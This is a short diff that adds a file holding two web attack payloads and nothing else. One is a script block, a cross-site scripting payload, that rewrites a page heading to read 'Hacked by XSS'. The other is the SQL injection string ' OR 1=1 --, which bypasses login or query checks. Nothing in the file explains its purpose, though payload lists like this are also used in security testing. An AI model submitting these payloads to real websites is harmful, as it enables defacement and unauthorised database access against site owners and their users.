@@ -1,0 +1,9 @@
+<script>
+document.querySelector('h1').innerText = 'Hacked by XSS';
+</script>
+
+------------------------------
+
+
+
+' OR 1=1 --
